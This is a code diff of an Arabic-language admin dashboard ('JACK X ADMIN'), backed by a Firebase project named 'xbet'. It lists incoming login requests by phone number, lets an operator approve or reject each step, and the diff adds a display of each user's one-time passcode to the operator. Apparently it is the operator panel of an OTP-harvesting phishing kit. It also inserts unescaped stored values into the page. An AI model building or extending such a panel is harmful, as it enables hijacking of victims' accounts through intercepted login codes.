@@ -6,89 +6,47 @@
 <title>JACK X | Admin Dashboard</title>
 <style>
   @import url('https://fonts.googleapis.com/css2?family=Tajawal:wght@400;500;700;800&display=swap');
+  :root {--primary:#E31D4A;--success:#34C759;--danger:#FF3B30;--bg:#F2F2F7;--card-bg:#FFFFFF;--text-main:#1C1C1E;--text-sub:#8E8E93;--border:rgba(0,0,0,0.06);--radius:18px;}
+  * {margin:0;padding:0;box-sizing:border-box;font-family:'Tajawal',sans-serif;-webkit-tap-highlight-color:transparent;}
+  body {background:var(--bg);color:var(--text-main);min-height:100vh;padding:20px;}
+  .admin-container {max-width:800px;margin:0 auto;}
+  .header {display:flex;justify-content:space-between;align-items:center;margin-bottom:30px;padding:0 5px;}
+  .logo {font-size:28px;font-weight:900;color:var(--primary);font-style:italic;letter-spacing:-1px;}
+  .lock-toggle {display:flex;align-items:center;gap:10px;background:var(--card-bg);padding:8px 16px;border-radius:30px;box-shadow:0 2px 10px rgba(0,0,0,0.05);cursor:pointer;transition:0.3s;border:1px solid var(--border);}
+  .lock-toggle:hover {transform:translateY(-2px);}
+  .lock-status {width:10px;height:10px;border-radius:50%;background:#ccc;transition:0.3s;}
+  .lock-status.active {background:var(--danger);box-shadow:0 0 8px rgba(255,59,48,0.4);}
+  .lock-label {font-size:13px;font-weight:700;color:var(--text-sub);}
   
-  :root {
-    --primary: #E31D4A;
-    --success: #34C759;
-    --danger: #FF3B30;
-    --bg: #F2F2F7;
-    --card-bg: #FFFFFF;
-    --text-main: #1C1C1E;
-    --text-sub: #8E8E93;
-    --border: rgba(0,0,0,0.06);
-    --radius: 18px;
-  }
-
-  * { margin:0; padding:0; box-sizing:border-box; font-family:'Tajawal', sans-serif; -webkit-tap-highlight-color:transparent; }
-  body { background: var(--bg); color: var(--text-main); min-height: 100vh; padding: 20px; }
-
-  .admin-container { max-width: 800px; margin: 0 auto; }
+  .stats-grid {display:grid;grid-template-columns:repeat(auto-fit,minmax(150px,1fr));gap:15px;margin-bottom:30px;}
+  .stat-card {background:var(--card-bg);padding:20px;border-radius:var(--radius);box-shadow:0 4px 15px rgba(0,0,0,0.03);text-align:center;}
+  .stat-num {font-size:32px;font-weight:900;color:var(--primary);margin-bottom:5px;}
+  .stat-label {font-size:13px;color:var(--text-sub);font-weight:600;}
   
-  /* Header */
-  .header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 30px; padding: 0 5px; }
-  .logo { font-size: 28px; font-weight: 900; color: var(--primary); font-style: italic; letter-spacing: -1px; }
-  .lock-toggle { 
-    display: flex; align-items: center; gap: 10px; background: var(--card-bg); 
-    padding: 8px 16px; border-radius: 30px; box-shadow: 0 2px 10px rgba(0,0,0,0.05); cursor: pointer;
-    transition: 0.3s; border: 1px solid var(--border);
-  }
-  .lock-toggle:hover { transform: translateY(-2px); }
-  .lock-status { width: 10px; height: 10px; border-radius: 50%; background: #ccc; transition: 0.3s; }
-  .lock-status.active { background: var(--danger); box-shadow: 0 0 8px rgba(255,59,48,0.4); }
-  .lock-label { font-size: 13px; font-weight: 700; color: var(--text-sub); }
-
-  /* Stats Cards */
-  .stats-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(150px, 1fr)); gap: 15px; margin-bottom: 30px; }
-  .stat-card { background: var(--card-bg); padding: 20px; border-radius: var(--radius); box-shadow: 0 4px 15px rgba(0,0,0,0.03); text-align: center; }
-  .stat-num { font-size: 32px; font-weight: 900; color: var(--primary); margin-bottom: 5px; }
-  .stat-label { font-size: 13px; color: var(--text-sub); font-weight: 600; }
-
-  /* Requests List */
-  .section-title { font-size: 20px; font-weight: 800; margin-bottom: 15px; display: flex; align-items: center; gap: 10px; }
-  .section-title::before { content:''; width: 4px; height: 20px; background: var(--primary); border-radius: 2px; }
-  
-  .requests-list { display: flex; flex-direction: column; gap: 12px; }
-  .req-card { 
-    background: var(--card-bg); border-radius: var(--radius); padding: 20px; 
-    box-shadow: 0 4px 15px rgba(0,0,0,0.03); display: flex; flex-direction: column; gap: 15px;
-    border: 1px solid transparent; transition: 0.3s; animation: slideIn 0.4s ease;
-  }
-  @keyframes slideIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
-  
-  .req-header { display: flex; justify-content: space-between; align-items: center; }
-  .req-phone { font-size: 18px; font-weight: 800; direction: ltr; text-align: right; }
-  .req-time { font-size: 12px; color: var(--text-sub); }
-  
-  .req-stage { 
-    display: inline-block; padding: 4px 12px; border-radius: 20px; font-size: 12px; font-weight: 700; 
-    background: #FFF3CD; color: #856404;
-  }
-  .req-stage.approved { background: #D4EDDA; color: #155724; }
-  .req-stage.rejected { background: #F8D7DA; color: #721C24; }
-  .req-stage.verified { background: #D1ECF1; color: #0C5460; }
-
-  .req-actions { display: flex; gap: 10px; margin-top: 5px; }
-  .btn-action { 
-    flex: 1; padding: 12px; border: none; border-radius: 12px; font-size: 14px; font-weight: 700; 
-    cursor: pointer; transition: 0.2s; display: flex; align-items: center; justify-content: center; gap: 6px;
-  }
-  .btn-approve { background: var(--success); color: #fff; }
-  .btn-reject { background: var(--danger); color: #fff; }
-  .btn-action:active { transform: scale(0.96); opacity: 0.9; }
-  .btn-action:disabled { background: #eee; color: #aaa; cursor: not-allowed; transform: none; }
-
-  .empty-state { text-align: center; padding: 40px; color: var(--text-sub); font-size: 15px; }
-  
-  /* Responsive */
-  @media(min-width: 600px) {
-    .req-card { flex-direction: row; align-items: center; justify-content: space-between; }
-    .req-info { flex: 1; }
-    .req-actions { width: auto; min-width: 200px; }
-  }
+  .section-title {font-size:20px;font-weight:800;margin-bottom:15px;display:flex;align-items:center;gap:10px;}
+  .section-title::before {content:'';width:4px;height:20px;background:var(--primary);border-radius:2px;}
+  .requests-list {display:flex;flex-direction:column;gap:12px;}
+  .req-card {background:var(--card-bg);border-radius:var(--radius);padding:20px;box-shadow:0 4px 15px rgba(0,0,0,0.03);display:flex;flex-direction:column;gap:15px;border:1px solid transparent;transition:0.3s;animation:slideIn 0.4s ease;}
+  @keyframes slideIn {from{opacity:0;transform:translateY(10px);}to{opacity:1;transform:translateY(0);}}
+  .req-header {display:flex;justify-content:space-between;align-items:center;}
+  .req-phone {font-size:18px;font-weight:800;direction:ltr;text-align:right;}
+  .req-time {font-size:12px;color:var(--text-sub);}
+  .req-stage {display:inline-block;padding:4px 12px;border-radius:20px;font-size:12px;font-weight:700;background:#FFF3CD;color:#856404;}
+  .req-stage.approved {background:#D4EDDA;color:#155724;}
+  .req-stage.rejected {background:#F8D7DA;color:#721C24;}
+  .req-stage.verified {background:#D1ECF1;color:#0C5460;}
+  .req-otp-code {font-size:24px;font-weight:900;color:var(--primary);letter-spacing:4px;direction:ltr;text-align:center;margin:10px 0;padding:10px;background:#FFF5F7;border-radius:12px;border:1px dashed var(--primary);}
+  .req-actions {display:flex;gap:10px;margin-top:5px;}
+  .btn-action {flex:1;padding:12px;border:none;border-radius:12px;font-size:14px;font-weight:700;cursor:pointer;transition:0.2s;display:flex;align-items:center;justify-content:center;gap:6px;}
+  .btn-approve {background:var(--success);color:#fff;}
+  .btn-reject {background:var(--danger);color:#fff;}
+  .btn-action:active {transform:scale(0.96);opacity:0.9;}
+  .btn-action:disabled {background:#eee;color:#aaa;cursor:not-allowed;transform:none;}
+  .empty-state {text-align:center;padding:40px;color:var(--text-sub);font-size:15px;}
+  @media(min-width:600px){.req-card{flex-direction:row;align-items:center;justify-content:space-between;}.req-info{flex:1;}.req-actions{width:auto;min-width:200px;}}
 </style>
 </head>
 <body>
-
 <div class="admin-container">
   <div class="header">
     <div class="logo">JACK X ADMIN</div>
@@ -97,182 +55,79 @@
       <span class="lock-label" id="lockLabel">التطبيق مفتوح</span>
     </div>
   </div>
-
   <div class="stats-grid">
-    <div class="stat-card">
-      <div class="stat-num" id="countPending">0</div>
-      <div class="stat-label">طلبات قيد الانتظار</div>
-    </div>
-    <div class="stat-card">
-      <div class="stat-num" id="countApproved">0</div>
-      <div class="stat-label">تمت الموافقة</div>
-    </div>
-    <div class="stat-card">
-      <div class="stat-num" id="countRejected">0</div>
-      <div class="stat-label">تم الرفض</div>
-    </div>
+    <div class="stat-card"><div class="stat-num" id="countPending">0</div><div class="stat-label">طلبات قيد الانتظار</div></div>
+    <div class="stat-card"><div class="stat-num" id="countApproved">0</div><div class="stat-label">تمت الموافقة</div></div>
+    <div class="stat-card"><div class="stat-num" id="countRejected">0</div><div class="stat-label">تم الرفض</div></div>
   </div>
-
   <div class="section-title">طلبات تسجيل الدخول النشطة</div>
-  <div class="requests-list" id="requestsList">
-    <div class="empty-state">لا توجد طلبات نشطة حالياً...</div>
-  </div>
+  <div class="requests-list" id="requestsList"><div class="empty-state">لا توجد طلبات نشطة حالياً...</div></div>
 </div>
 
-<!-- Firebase SDKs -->
 <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app-compat.js"></script>
 <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-database-compat.js"></script>
-
 <script>
-  const firebaseConfig = {
-    apiKey: "AIzaSyDST9eIFpUdbXa2aaVWVPt6LjZNL4R2UKA",
-    authDomain: "xbet-86a1f.firebaseapp.com",
-    databaseURL: "https://xbet-86a1f-default-rtdb.firebaseio.com",
-    projectId: "xbet-86a1f",
-    storageBucket: "xbet-86a1f.firebasestorage.app",
-    messagingSenderId: "1049564126267",
-    appId: "1:1049564126267:web:58eb824eda9566ae79501e",
-    measurementId: "G-MZDXDMQ2HB"
-  };
+  const firebaseConfig={apiKey:"AIzaSyDST9eIFpUdbXa2aaVWVPt6LjZNL4R2UKA",authDomain:"xbet-86a1f.firebaseapp.com",databaseURL:"https://xbet-86a1f-default-rtdb.firebaseio.com",projectId:"xbet-86a1f",storageBucket:"xbet-86a1f.firebasestorage.app",messagingSenderId:"1049564126267",appId:"1:1049564126267:web:58eb824eda9566ae79501e",measurementId:"G-MZDXDMQ2HB"};
+  if(!firebase.apps.length) firebase.initializeApp(firebaseConfig);
+  const db=firebase.database();
+  let isLocked=false,activeRequests={};
+  const lockToggle=document.getElementById('lockToggle'),lockStatus=document.getElementById('lockStatus'),lockLabel=document.getElementById('lockLabel'),requestsList=document.getElementById('requestsList'),countPending=document.getElementById('countPending'),countApproved=document.getElementById('countApproved'),countRejected=document.getElementById('countRejected');
 
-  if (!firebase.apps.length) firebase.initializeApp(firebaseConfig);
-  const db = firebase.database();
+  function initAppLock(){db.ref('app_lock').on('value',snap=>{const data=snap.val();isLocked=data&&data.locked===true;updateLockUI();});}
+  function toggleAppLock(){const newStatus=!isLocked;db.ref('app_lock').set({locked:newStatus,updatedAt:Date.now()}).then(()=>console.log("App lock updated:",newStatus)).catch(err=>alert("خطأ في تحديث القفل: "+err.message));}
+  function updateLockUI(){lockStatus.classList.toggle('active',isLocked);lockLabel.textContent=isLocked?"التطبيق مقفل":"التطبيق مفتوح";lockToggle.style.borderColor=isLocked?"var(--danger)":"var(--border)";}
 
-  // State
-  let isLocked = false;
-  let activeRequests = {};
-
-  // DOM Elements
-  const lockToggle = document.getElementById('lockToggle');
-  const lockStatus = document.getElementById('lockStatus');
-  const lockLabel = document.getElementById('lockLabel');
-  const requestsList = document.getElementById('requestsList');
-  const countPending = document.getElementById('countPending');
-  const countApproved = document.getElementById('countApproved');
-  const countRejected = document.getElementById('countRejected');
-
-  // --- App Lock Management ---
-  function initAppLock() {
-    db.ref('app_lock').on('value', snap => {
-      const data = snap.val();
-      isLocked = data && data.locked === true;
-      updateLockUI();
+  function initRequestsListener(){
+    db.ref('login_requests').on('value',snapshot=>{
+      const data=snapshot.val()||{};activeRequests={};
+      Object.keys(data).forEach(key=>{const req=data[key];if(req.status!=='verified') activeRequests[key]=req;});
+      renderRequests();updateStats(data);
     });
   }
 
-  function toggleAppLock() {
-    const newStatus = !isLocked;
-    db.ref('app_lock').set({ locked: newStatus, updatedAt: Date.now() })
-      .then(() => console.log("App lock updated:", newStatus))
-      .catch(err => alert("خطأ في تحديث القفل: " + err.message));
-  }
-
-  function updateLockUI() {
-    lockStatus.classList.toggle('active', isLocked);
-    lockLabel.textContent = isLocked ? "التطبيق مقفل" : "التطبيق مفتوح";
-    lockToggle.style.borderColor = isLocked ? "var(--danger)" : "var(--border)";
-  }
-
-  // --- Requests Management ---
-  function initRequestsListener() {
-    db.ref('login_requests').on('value', snapshot => {
-      const data = snapshot.val() || {};
-      activeRequests = {};
+  function renderRequests(){
+    const keys=Object.keys(activeRequests);
+    if(keys.length===0){requestsList.innerHTML='<div class="empty-state">لا توجد طلبات نشطة حالياً...</div>';return;}
+    keys.sort((a,b)=>activeRequests[b].timestamp-activeRequests[a].timestamp);
+    requestsList.innerHTML=keys.map(id=>{
+      const req=activeRequests[id];
+      const time=new Date(req.timestamp).toLocaleTimeString('ar-SA',{hour:'2-digit',minute:'2-digit'});
+      const stageClass=req.status.replace('_','-');
+      let stageText="قيد الانتظار";
+      if(req.status==='approved') stageText="بانتظار الـ OTP";
+      if(req.status==='otp_pending') stageText="بانتظار تأكيد الرمز";
+      if(req.status==='rejected') stageText="مرفوض";
+      if(req.status==='otp_rejected') stageText="رمز مرفوض";
       
-      // Filter only active/pending requests (exclude verified/archived if needed)
-      Object.keys(data).forEach(key => {
-        const req = data[key];
-        // Show all except 'verified' to keep list clean, or show all based on preference
-        if(req.status !== 'verified') {
-          activeRequests[key] = req;
-        }
-      });
-      
-      renderRequests();
-      updateStats(data);
-    });
-  }
+      // ✅ عرض رمز OTP فقط عندما يكون في مرحلة otp_pending
+      const otpDisplay = (req.status === 'otp_pending' && req.otp_code) 
+        ? `<div class="req-otp-code">${req.otp_code}</div>` 
+        : '';
 
-  function renderRequests() {
-    const keys = Object.keys(activeRequests);
-    if(keys.length === 0) {
-      requestsList.innerHTML = '<div class="empty-state">لا توجد طلبات نشطة حالياً...</div>';
-      return;
-    }
-
-    // Sort by timestamp descending (newest first)
-    keys.sort((a,b) => activeRequests[b].timestamp - activeRequests[a].timestamp);
-
-    requestsList.innerHTML = keys.map(id => {
-      const req = activeRequests[id];
-      const time = new Date(req.timestamp).toLocaleTimeString('ar-SA', {hour:'2-digit', minute:'2-digit'});
-      const stageClass = req.status.replace('_', '-'); // e.g., otp_pending -> otp-pending
-      
-      let stageText = "قيد الانتظار";
-      if(req.status === 'approved') stageText = "بانتظار الـ OTP";
-      if(req.status === 'otp_pending') stageText = "بانتظار تأكيد الرمز";
-      if(req.status === 'rejected') stageText = "مرفوض";
-      if(req.status === 'otp_rejected') stageText = "رمز مرفوض";
-
-      // Determine available actions
-      const showApprove = ['pending', 'otp_pending'].includes(req.status);
-      const showReject = ['pending', 'otp_pending', 'approved'].includes(req.status);
-
+      const showApprove=['pending','otp_pending'].includes(req.status);
+      const showReject=['pending','otp_pending','approved'].includes(req.status);
       return `
         <div class="req-card">
           <div class="req-info">
-            <div class="req-header">
-              <span class="req-phone">${req.phone}</span>
-              <span class="req-time">${time}</span>
-            </div>
+            <div class="req-header"><span class="req-phone">${req.phone}</span><span class="req-time">${time}</span></div>
+            ${otpDisplay}
             <span class="req-stage ${stageClass}">${stageText}</span>
           </div>
           <div class="req-actions">
-            ${showApprove ? `<button class="btn-action btn-approve" onclick="updateStatus('${id}', '${getNextApproveStatus(req.status)}')">✓ موافقة</button>` : ''}
-            ${showReject ? `<button class="btn-action btn-reject" onclick="updateStatus('${id}', '${getNextRejectStatus(req.status)}')">✕ رفض</button>` : ''}
-            ${!showApprove && !showReject ? `<button class="btn-action" disabled>لا توجد إجراءات</button>` : ''}
+            ${showApprove?`<button class="btn-action btn-approve" onclick="updateStatus('${id}','${getNextApproveStatus(req.status)}')">✓ موافقة</button>`:''}
+            ${showReject?`<button class="btn-action btn-reject" onclick="updateStatus('${id}','${getNextRejectStatus(req.status)}')">✕ رفض</button>`:''}
+            ${!showApprove&&!showReject?`<button class="btn-action" disabled>لا توجد إجراءات</button>`:''}
           </div>
-        </div>
-      `;
+        </div>`;
     }).join('');
   }
 
-  function getNextApproveStatus(current) {
-    if(current === 'pending') return 'approved';
-    if(current === 'otp_pending') return 'otp_approved';
-    return current;
-  }
+  function getNextApproveStatus(c){if(c==='pending')return'approved';if(c==='otp_pending')return'otp_approved';return c;}
+  function getNextRejectStatus(c){if(c==='pending'||c==='approved')return'rejected';if(c==='otp_pending')return'otp_rejected';return c;}
+  function updateStatus(id,newStatus){db.ref(`login_requests/${id}`).update({status:newStatus,adminActionAt:Date.now()}).catch(err=>alert("فشل في التحديث: "+err.message));}
+  function updateStats(allData){let p=0,a=0,r=0;Object.values(allData).forEach(req=>{if(['pending','otp_pending'].includes(req.status))p++;else if(['approved','otp_approved'].includes(req.status))a++;else if(['rejected','otp_rejected'].includes(req.status))r++;});countPending.textContent=p;countApproved.textContent=a;countRejected.textContent=r;}
 
-  function getNextRejectStatus(current) {
-    if(current === 'pending' || current === 'approved') return 'rejected';
-    if(current === 'otp_pending') return 'otp_rejected';
-    return current;
-  }
-
-  function updateStatus(id, newStatus) {
-    db.ref(`login_requests/${id}`).update({ 
-      status: newStatus, 
-      adminActionAt: Date.now() 
-    }).catch(err => alert("فشل في التحديث: " + err.message));
-  }
-
-  function updateStats(allData) {
-    let pending = 0, approved = 0, rejected = 0;
-    Object.values(allData).forEach(req => {
-      if(['pending', 'otp_pending'].includes(req.status)) pending++;
-      else if(['approved', 'otp_approved'].includes(req.status)) approved++;
-      else if(['rejected', 'otp_rejected'].includes(req.status)) rejected++;
-    });
-    
-    countPending.textContent = pending;
-    countApproved.textContent = approved;
-    countRejected.textContent = rejected;
-  }
-
-  // Initialize
-  initAppLock();
-  initRequestsListener();
-
+  initAppLock();initRequestsListener();
 </script>
 </body>
 </html>
